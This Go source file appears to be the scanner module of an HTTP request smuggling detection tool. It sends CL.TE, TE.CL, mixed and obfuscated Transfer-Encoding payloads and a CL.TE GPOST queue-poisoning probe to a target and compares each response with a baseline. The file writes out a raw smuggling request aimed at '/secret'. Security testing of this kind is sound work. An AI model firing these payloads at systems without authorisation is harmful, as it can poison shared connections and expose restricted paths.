package scanner

import (
	"fmt"
	"strings"

	"smuggler/internal/ai"
	"smuggler/internal/baseline"
	"smuggler/internal/detector"
	"smuggler/internal/models"
	"smuggler/internal/payload"
	"smuggler/internal/sender"
)

// Scanner orchestrates the entire HTTP request smuggling detection workflow.
type Scanner struct {
	target           string
	port             int
	sender           *sender.RawSender
	baselineManager  *baseline.Manager
	detector         *detector.Detector
	aiProvider       ai.Provider
	baselineResponse *models.HTTPResponse
	results          []*models.ScanResult
	report           *detector.DetectionReport
}

// NewScanner creates a new scanner for a target.
func NewScanner(target string, port int) *Scanner {
	s := sender.NewRawSender()

	return &Scanner{
		target:          target,
		port:            port,
		sender:          s,
		baselineManager: baseline.NewManager(s, target, port),
		detector:        detector.NewDetector(),
		results:         make([]*models.ScanResult, 0),
	}
}

// SetConfidenceThreshold sets the detector's confidence threshold.
func (sc *Scanner) SetConfidenceThreshold(threshold float64) *Scanner {
	sc.detector.SetConfidenceThreshold(threshold)
	return sc
}

// SetTLS enables or disables TLS/HTTPS for connections.
func (sc *Scanner) SetTLS(useTLS bool) *Scanner {
	sc.sender.SetTLS(useTLS)
	return sc
}

// SetInsecureTLS allows insecure TLS connections (skip certificate verification).
func (sc *Scanner) SetInsecureTLS(insecure bool) *Scanner {
	sc.sender.SetInsecureTLS(insecure)
	return sc
}

// SetAIAnalyzer sets an AI analyzer for intelligent response analysis.
func (sc *Scanner) SetAIAnalyzer(analyzer *ai.AIAnalyzer) *Scanner {
	sc.aiProvider = analyzer
	return sc
}

// SetAIProvider sets an AI provider (OpenAI, Ollama, etc.) for intelligent response analysis.
func (sc *Scanner) SetAIProvider(provider ai.Provider) *Scanner {
	sc.aiProvider = provider
	return sc
}

// CaptureBaseline sends a normal request to establish baseline behavior.
func (sc *Scanner) CaptureBaseline() error {
	fmt.Printf("[*] Capturing baseline response for %s:%d\n", sc.target, sc.port)

	resp, err := sc.baselineManager.CaptureBaseline()
	if err != nil {
		return fmt.Errorf("baseline capture failed: %w", err)
	}

	sc.baselineResponse = resp
	fmt.Printf("    Status: %d | Timing: %d ms | Headers: %d | Body: %d bytes\n",
		resp.StatusCode, resp.TimingMS, len(resp.Headers), len(resp.Body))

	return nil
}

// TestCLTE tests for CL.TE vulnerability.
func (sc *Scanner) TestCLTE() error {
	if sc.baselineResponse == nil {
		return fmt.Errorf("baseline not captured; call CaptureBaseline first")
	}

	fmt.Printf("\n[*] Testing CL.TE (Content-Length / Transfer-Encoding)...\n")

	gen := payload.NewGenerator(sc.target, sc.port)
	gen.SetPath("/")
	gen.AddHeader("Connection", "close")

	payloadStr, err := gen.GenerateCLTEPayload("GET /admin HTTP/1.1\r\nHost: " + sc.target + "\r\n\r\n")
	if err != nil {
		return fmt.Errorf("CL.TE payload generation failed: %w", err)
	}

	targetAddr := fmt.Sprintf("%s:%d", sc.target, sc.port)
	testResp, err := sc.sender.SendRequest(targetAddr, payloadStr)
	if err != nil {
		return fmt.Errorf("CL.TE test send failed: %w", err)
	}

	fmt.Printf("    Response: %d | Timing: %d ms\n", testResp.StatusCode, testResp.TimingMS)

	comparison := sc.baselineManager.CompareResponses(sc.baselineResponse, testResp)
	result := sc.detector.AnalyzeCLTE(sc.target, comparison)
	
	// Run AI analysis if provider available
	if sc.aiProvider != nil {
		sc.runAIAnalysis("CL.TE", sc.baselineResponse, testResp, result)
	}
	
	sc.results = append(sc.results, result)

	fmt.Printf("    Result: %s\n", func() string {
		if result.Suspicious {
			return "SUSPICIOUS ✗"
		}
		return "CLEAN ✓"
	}())

	return nil
}

// runAIAnalysis calls the AI provider to analyze a test result
func (sc *Scanner) runAIAnalysis(testType string, baseline, test *models.HTTPResponse, result *models.ScanResult) {
	baseline_map := map[string]interface{}{
		"status":    baseline.StatusCode,
		"body_len":  len(baseline.Body),
		"timing":    baseline.TimingMS,
		"headers":   len(baseline.Headers),
	}
	
	test_map := map[string]interface{}{
		"status":    test.StatusCode,
		"body_len":  len(test.Body),
		"timing":    test.TimingMS,
		"headers":   len(test.Headers),
	}

	aiResult, err := sc.aiProvider.AnalyzeResponses(baseline_map, test_map, testType)
	if err != nil {
		fmt.Printf("    [AI Analysis Error: %v]\n", err)
		return
	}

	if aiResult != nil && aiResult.Confidence > 0 {
		fmt.Printf("\n    [AI Analysis - %s]\n", sc.aiProvider.Name())
		fmt.Printf("    Confidence: %.1f%%\n", aiResult.Confidence*100)
		fmt.Printf("    Reasoning: %s\n", aiResult.Reasoning)
		if len(aiResult.SuspiciousSignals) > 0 {
			fmt.Printf("    Signals: %v\n", aiResult.SuspiciousSignals)
		}
		if len(aiResult.Recommendations) > 0 {
			fmt.Printf("    Next Steps: %v\n", aiResult.Recommendations)
		}
		
		// Update result with AI confidence if higher
		if aiResult.Confidence > result.ConfidenceScore {
			result.ConfidenceScore = aiResult.Confidence
		}
		if aiResult.IsVulnerable && !result.Suspicious {
			result.Suspicious = true
		}
	}
}

// TestTECL tests for TE.CL vulnerability.
func (sc *Scanner) TestTECL() error {
	if sc.baselineResponse == nil {
		return fmt.Errorf("baseline not captured; call CaptureBaseline first")
	}

	fmt.Printf("\n[*] Testing TE.CL (Transfer-Encoding / Content-Length)...\n")

	gen := payload.NewGenerator(sc.target, sc.port)
	gen.SetPath("/")
	gen.AddHeader("Connection", "close")

	payloadStr, err := gen.GenerateTECLPayload("GET /api HTTP/1.1\r\nHost: " + sc.target + "\r\n\r\n")
	if err != nil {
		return fmt.Errorf("TE.CL payload generation failed: %w", err)
	}

	targetAddr := fmt.Sprintf("%s:%d", sc.target, sc.port)
	testResp, err := sc.sender.SendRequest(targetAddr, payloadStr)
	if err != nil {
		return fmt.Errorf("TE.CL test send failed: %w", err)
	}

	fmt.Printf("    Response: %d | Timing: %d ms\n", testResp.StatusCode, testResp.TimingMS)

	comparison := sc.baselineManager.CompareResponses(sc.baselineResponse, testResp)
	result := sc.detector.AnalyzeTECL(sc.target, comparison)
	
	// Run AI analysis if provider available
	if sc.aiProvider != nil {
		sc.runAIAnalysis("TE.CL", sc.baselineResponse, testResp, result)
	}
	
	sc.results = append(sc.results, result)

	fmt.Printf("    Result: %s\n", func() string {
		if result.Suspicious {
			return "SUSPICIOUS ✗"
		}
		return "CLEAN ✓"
	}())

	return nil
}

// TestMixedTE tests for Mixed Transfer-Encoding header exploitation.
func (sc *Scanner) TestMixedTE() error {
	if sc.baselineResponse == nil {
		return fmt.Errorf("baseline not captured; call CaptureBaseline first")
	}

	fmt.Printf("\n[*] Testing Mixed-TE (Multiple Transfer-Encoding headers)...\n")

	payloadStr := fmt.Sprintf(
		"GET / HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n"+
			"Transfer-Encoding: identity\r\n"+
			"Transfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n"+
			"0\r\n\r\nGET /secret HTTP/1.1\r\nHost: %s\r\n\r\n",
		sc.target, sc.port, sc.target)

	targetAddr := fmt.Sprintf("%s:%d", sc.target, sc.port)
	testResp, err := sc.sender.SendRequest(targetAddr, payloadStr)
	if err != nil {
		return fmt.Errorf("Mixed-TE test send failed: %w", err)
	}

	fmt.Printf("    Response: %d | Timing: %d ms\n", testResp.StatusCode, testResp.TimingMS)

	comparison := sc.baselineManager.CompareResponses(sc.baselineResponse, testResp)
	result := sc.detector.AnalyzeMixedTE(sc.target, comparison)
	
	// Run AI analysis if provider available
	if sc.aiProvider != nil {
		sc.runAIAnalysis("Mixed-TE", sc.baselineResponse, testResp, result)
	}
	
	sc.results = append(sc.results, result)

	fmt.Printf("    Result: %s\n", func() string {
		if result.Suspicious {
			return "SUSPICIOUS ✗"
		}
		return "CLEAN ✓"
	}())

	return nil
}

// TestObfuscatedTE tests for obfuscated Transfer-Encoding header exploitation.
// This technique uses non-standard TE header values (e.g., "cow") to bypass proxies.
func (sc *Scanner) TestObfuscatedTE() error {
	if sc.baselineResponse == nil {
		return fmt.Errorf("baseline not captured; call CaptureBaseline first")
	}

	fmt.Printf("\n[*] Testing Obfuscated-TE (Transfer-Encoding with non-standard values)...\n")

	gen := payload.NewGenerator(sc.target, sc.port)
	gen.SetPath("/")
	gen.AddHeader("Connection", "close")

	// Test with "cow" obfuscation (common exploitation technique)
	payloadStr, err := gen.GenerateObfuscatedTEPayload(
		"POST / HTTP/1.1\r\nHost: "+sc.target+"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1",
		"cow",
	)
	if err != nil {
		return fmt.Errorf("Obfuscated-TE payload generation failed: %w", err)
	}

	targetAddr := fmt.Sprintf("%s:%d", sc.target, sc.port)
	testResp, err := sc.sender.SendRequest(targetAddr, payloadStr)
	if err != nil {
		return fmt.Errorf("Obfuscated-TE test send failed: %w", err)
	}

	fmt.Printf("    Response: %d | Timing: %d ms\n", testResp.StatusCode, testResp.TimingMS)

	comparison := sc.baselineManager.CompareResponses(sc.baselineResponse, testResp)
	result := sc.detector.AnalyzeObfuscatedTE(sc.target, comparison)
	
	// Run AI analysis if provider available
	if sc.aiProvider != nil {
		sc.runAIAnalysis("Obfuscated-TE", sc.baselineResponse, testResp, result)
	}
	
	sc.results = append(sc.results, result)

	fmt.Printf("    Result: %s\n", func() string {
		if result.Suspicious {
			return "SUSPICIOUS ✗"
		}
		return "CLEAN ✓"
	}())

	return nil
}

func (sc *Scanner) TestCLTE_GPOST() error {
	if sc.baselineResponse == nil {
		return fmt.Errorf("baseline not captured; call CaptureBaseline first")
	}

	fmt.Printf("\n[*] Testing CL.TE GPOST poisoning (multi-request attack)...\n")

	targetAddr := fmt.Sprintf("%s:%d", sc.target, sc.port)

	fmt.Printf("    [1] Sending smuggling payload...\n")
	smugglePayload := payload.CL_TE_GPOST_ATTACK(sc.target, sc.port)
	resp1, err := sc.sender.SendRequest(targetAddr, smugglePayload)
	if err != nil {
		return fmt.Errorf("smuggling payload send failed: %w", err)
	}
	fmt.Printf("        Response: %d | Timing: %d ms\n", resp1.StatusCode, resp1.TimingMS)

	fmt.Printf("    [2] Sending probe request after smuggling...\n")
	probePayload := payload.ProbeRequestAfterPoison(sc.target, sc.port)
	resp2, err := sc.sender.SendRequest(targetAddr, probePayload)
	if err != nil {
		return fmt.Errorf("probe request send failed: %w", err)
	}
	fmt.Printf("        Response: %d | Timing: %d ms\n", resp2.StatusCode, resp2.TimingMS)

	fmt.Printf("    [3] Analyzing probe response for poisoning...\n")

	var suspicious bool
	var reason string

	if strings.Contains(strings.ToUpper(resp2.Raw), "GPOST") {
		suspicious = true
		reason = "Probe response contains 'GPOST' method - request successfully poisoned!"
		fmt.Printf("        ✗ SUSPICIOUS: Response contains 'GPOST' indicator\n")
	} else if strings.Contains(strings.ToUpper(resp2.Raw), "UNRECOGNIZED METHOD") {
		suspicious = true
		reason = "Probe response indicates unrecognized method - likely poisoned request"
		fmt.Printf("        ✗ SUSPICIOUS: Response mentions unrecognized method\n")
	} else if resp2.StatusCode == 405 || resp2.StatusCode == 400 {
		if resp2.StatusCode != sc.baselineResponse.StatusCode {
			suspicious = true
			reason = fmt.Sprintf("Probe returned %d (baseline was %d) - possible poisoning", resp2.StatusCode, sc.baselineResponse.StatusCode)
			fmt.Printf("        ~ POSSIBLE: Status code changed after smuggling\n")
		}
	}

	result := &models.ScanResult{
		Target:           sc.target,
		Technique:        "CL.TE-GPOST",
		Suspicious:       suspicious,
		Reason:           reason,
		ResponseTimeDiff: resp2.TimingMS - sc.baselineResponse.TimingMS,
		BaselineResponse: sc.baselineResponse,
		TestResponse:     resp2,
	}

	if sc.aiProvider != nil {
		sc.runAIAnalysis("CL.TE-GPOST", sc.baselineResponse, resp2, result)
	}

	sc.results = append(sc.results, result)

	fmt.Printf("    Result: %s\n", func() string {
		if result.Suspicious {
			return "SUSPICIOUS ✗"
		}
		return "UNCLEAR ~"
	}())

	if len(resp2.Body) > 0 && len(resp2.Body) < 500 {
		fmt.Printf("    Response Body Preview:\n%s\n", resp2.Body)
	} else if len(resp2.Body) > 0 {
		fmt.Printf("    Response Body (first 300 chars):\n%s...\n", resp2.Body[:300])
	}

	return nil
}

// Run executes the full scanning workflow.
func (sc *Scanner) Run() error {
	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	fmt.Printf("HTTP REQUEST SMUGGLING SCANNER\n")
	fmt.Printf("Target: %s:%d\n", sc.target, sc.port)
	fmt.Printf("%s\n\n", strings.Repeat("=", 60))

	if err := sc.CaptureBaseline(); err != nil {
		return err
	}

	if err := sc.TestCLTE(); err != nil {
		return err
	}

	if err := sc.TestTECL(); err != nil {
		return err
	}

	if err := sc.TestMixedTE(); err != nil {
		return err
	}

	if err := sc.TestObfuscatedTE(); err != nil {
		return err
	}

	if err := sc.TestCLTE_GPOST(); err != nil {
		return err
	}

	sc.generateFinalReport()

	return nil
}

// generateFinalReport creates and stores the detection report.
func (sc *Scanner) generateFinalReport() {
	sc.report = sc.detector.GenerateReport(sc.target, sc.results...)
}

// PrintReport prints the final detection report to stdout.
func (sc *Scanner) PrintReport() {
	if sc.report == nil {
		fmt.Println("[!] No report available. Run the scanner first.")
		return
	}

	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	fmt.Print(sc.report.String())
	fmt.Printf("%s\n", strings.Repeat("=", 60))
}

// GetResults returns the raw scan results.
func (sc *Scanner) GetResults() []*models.ScanResult {
	return sc.results
}

// GetReport returns the detection report.
func (sc *Scanner) GetReport() *detector.DetectionReport {
	return sc.report
}

// IsVulnerable returns true if any technique was detected as vulnerable.
func (sc *Scanner) IsVulnerable() bool {
	if sc.report == nil {
		return false
	}
	return sc.report.Vulnerable > 0
}

// GetMostLikelyTechnique returns the most likely vulnerability type.
func (sc *Scanner) GetMostLikelyTechnique() string {
	if sc.report == nil || sc.report.Vulnerable == 0 {
		return "None"
	}
	return sc.report.MostLikelyTechnique
}

// Summary returns a brief text summary of the scan.
func (sc *Scanner) Summary() string {
	if sc.report == nil {
		return "Scan not completed"
	}

	var summary strings.Builder
	summary.WriteString(fmt.Sprintf("Target: %s:%d\n", sc.target, sc.port))
	summary.WriteString(fmt.Sprintf("Tests run: %d\n", sc.report.TotalTests))
	summary.WriteString(fmt.Sprintf("Vulnerable: %d\n", sc.report.Vulnerable))

	if sc.report.Vulnerable > 0 {
		summary.WriteString(fmt.Sprintf("Most likely: %s\n", sc.report.MostLikelyTechnique))
		summary.WriteString("Status: VULNERABLE ✗\n")
	} else {
		summary.WriteString("Status: CLEAN ✓\n")
	}

	return summary.String()
}
